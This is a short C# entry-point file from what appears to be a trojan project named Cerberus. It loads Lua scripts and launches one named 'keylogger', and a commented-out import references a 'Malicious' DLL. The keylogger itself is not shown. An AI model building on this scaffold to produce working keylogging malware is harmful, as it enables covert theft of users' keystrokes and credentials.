using Cerberus.Presentation.Trojan.Core;

public class Program
{

    //[DllImport("Cerberus.Malicious.dll", CallingConvention = CallingConvention.Cdecl)]
    //public static extern int testMan();

    private static async Task Main(string[] args)
    {

        LuaScriptManager _scriptManager = new LuaScriptManager();
        _scriptManager.LoadScripts();

        _ = _scriptManager.StartScriptAsync("luaok");
        _ = await _scriptManager.StartScriptAsync("keylogger");

    }
}